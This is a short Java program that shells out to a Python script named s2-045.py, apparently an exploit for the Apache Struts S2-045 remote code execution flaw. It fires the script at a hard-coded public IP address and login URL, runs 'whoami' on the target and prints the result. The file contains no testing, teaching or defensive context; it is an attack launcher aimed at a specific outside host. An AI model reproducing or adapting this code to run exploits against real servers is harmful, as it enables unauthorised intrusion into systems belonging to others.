package biz.nilstest;

import java.io.InputStreamReader;
import java.io.LineNumberReader;

/**
 * Created by IDEA
 * User:    tiztm
 * Date:    2017/4/24.
 */
public class LinuxShell {
    public static void main(String[] args) {

        String cmd = "python /root/python/s2-045.py http://202.102.101.151:10082/userLogin2354345.action whoami";

        try {
            Process process = Runtime.getRuntime().exec(cmd);

            InputStreamReader ir = new InputStreamReader(process.getInputStream());
            LineNumberReader input = new LineNumberReader(ir);

            String line;
            while ((line = input.readLine()) != null) {
                System.out.println(line);
            }
        } catch (java.io.IOException e) {
            System.err.println("IOException " + e.getMessage());
        }
    }
}
